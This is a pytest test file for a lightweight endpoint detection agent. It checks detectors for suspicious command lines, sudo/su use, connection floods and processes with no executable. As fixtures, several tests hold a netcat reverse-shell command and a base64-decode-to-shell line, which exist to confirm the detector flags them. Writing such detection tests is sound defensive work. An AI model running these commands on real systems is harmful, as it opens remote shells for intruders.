"""Tests for Lightweight EDR Agent core."""

from __future__ import annotations

from datetime import UTC, datetime
from pathlib import Path
from unittest.mock import patch

from project_77.core import (
    EDRAgent,
    Finding,
    ProcessSnapshot,
    ThreatLevel,
    detect_hidden_processes,
    detect_privileged_execution,
    detect_suspicious_cmdline,
    detect_suspicious_connections,
)


def make_snapshot(
    pid: int = 1000,
    name: str = "python",
    exe: str = "/usr/bin/python3",
    cmdline: str = "python3 script.py",
    username: str = "user",
    connections: int = 0,
    ppid: int = 1,
) -> ProcessSnapshot:
    return ProcessSnapshot(
        pid=pid,
        ppid=ppid,
        name=name,
        exe=exe,
        cmdline=cmdline,
        username=username,
        create_time=1700000000.0,
        connections=connections,
    )


class TestDetectSuspiciousCmdline:
    def test_detects_netcat(self) -> None:
        snap = make_snapshot(cmdline="nc -e /bin/sh 10.0.0.1 4444")
        finding = detect_suspicious_cmdline(snap)
        assert finding is not None
        assert finding.threat_level == ThreatLevel.HIGH
        assert finding.category == "suspicious_cmdline"

    def test_detects_base64_decode(self) -> None:
        snap = make_snapshot(cmdline="bash -c 'echo aGVsbG8= | base64 -d | sh'")
        finding = detect_suspicious_cmdline(snap)
        assert finding is not None

    def test_clean_process(self) -> None:
        snap = make_snapshot(cmdline="/usr/sbin/sshd -D")
        finding = detect_suspicious_cmdline(snap)
        assert finding is None

    def test_tmp_path_flagged(self) -> None:
        snap = make_snapshot(cmdline="/tmp/malware run")
        finding = detect_suspicious_cmdline(snap)
        assert finding is not None


class TestDetectPrivilegedExecution:
    def test_detects_sudo(self) -> None:
        snap = make_snapshot(name="sudo", cmdline="sudo -i")
        finding = detect_privileged_execution(snap)
        assert finding is not None
        assert finding.mitre_technique == "T1548.003"

    def test_detects_su(self) -> None:
        snap = make_snapshot(name="su", cmdline="su root")
        finding = detect_privileged_execution(snap)
        assert finding is not None

    def test_normal_process_ignored(self) -> None:
        snap = make_snapshot(name="nginx", cmdline="nginx -g daemon off")
        finding = detect_privileged_execution(snap)
        assert finding is None


class TestDetectSuspiciousConnections:
    def test_high_connection_count(self) -> None:
        snap = make_snapshot(connections=100)
        finding = detect_suspicious_connections(snap)
        assert finding is not None
        assert finding.category == "connection_flood"

    def test_normal_connection_count(self) -> None:
        snap = make_snapshot(connections=5)
        finding = detect_suspicious_connections(snap)
        assert finding is None

    def test_boundary_50(self) -> None:
        snap = make_snapshot(connections=50)
        assert detect_suspicious_connections(snap) is None
        snap51 = make_snapshot(connections=51)
        assert detect_suspicious_connections(snap51) is not None


class TestDetectHiddenProcesses:
    def test_no_exe_flagged(self) -> None:
        snap = make_snapshot(pid=5000, name="evil", exe="", cmdline="")
        findings = detect_hidden_processes([snap])
        assert len(findings) == 1
        assert findings[0].mitre_technique == "T1055"

    def test_kworker_ignored(self) -> None:
        snap = make_snapshot(pid=5000, name="kworker", exe="")
        findings = detect_hidden_processes([snap])
        assert findings == []

    def test_normal_process_ignored(self) -> None:
        snap = make_snapshot(pid=1234, exe="/usr/bin/python3")
        findings = detect_hidden_processes([snap])
        assert findings == []


class TestFinding:
    def test_to_dict(self) -> None:
        f = Finding(
            finding_id="abc123",
            timestamp=datetime.now(UTC),
            threat_level=ThreatLevel.HIGH,
            category="test",
            description="test finding",
            details={"key": "val"},
            mitre_technique="T1059",
        )
        d = f.to_dict()
        assert d["finding_id"] == "abc123"
        assert d["threat_level"] == "HIGH"
        assert d["mitre_technique"] == "T1059"

    def test_make_id_deterministic(self) -> None:
        id1 = Finding.make_id("cat", "details")
        id2 = Finding.make_id("cat", "details")
        assert id1 == id2

    def test_make_id_unique(self) -> None:
        id1 = Finding.make_id("cat1", "details")
        id2 = Finding.make_id("cat2", "details")
        assert id1 != id2


class TestEDRAgent:
    def test_scan_returns_list(self) -> None:
        agent = EDRAgent()
        findings = agent.scan_once()
        assert isinstance(findings, list)

    def test_output_file_written(self, tmp_path: Path) -> None:
        out = tmp_path / "findings.jsonl"
        agent = EDRAgent(output_path=out)
        snap = make_snapshot(cmdline="nc -e /bin/sh 10.0.0.1 4444")
        with patch("project_77.core.snapshot_processes", return_value=[snap]):
            with patch("project_77.core.detect_suspicious_listening_ports", return_value=[]):
                agent.scan_once()
        assert out.exists()

    def test_summary_counts(self) -> None:
        agent = EDRAgent()
        snap = make_snapshot(cmdline="nc -e /bin/sh 10.0.0.1 4444")
        with patch("project_77.core.snapshot_processes", return_value=[snap]):
            with patch("project_77.core.detect_suspicious_listening_ports", return_value=[]):
                agent.scan_once()
        summary = agent.summary()
        assert isinstance(summary, dict)
        assert "HIGH" in summary
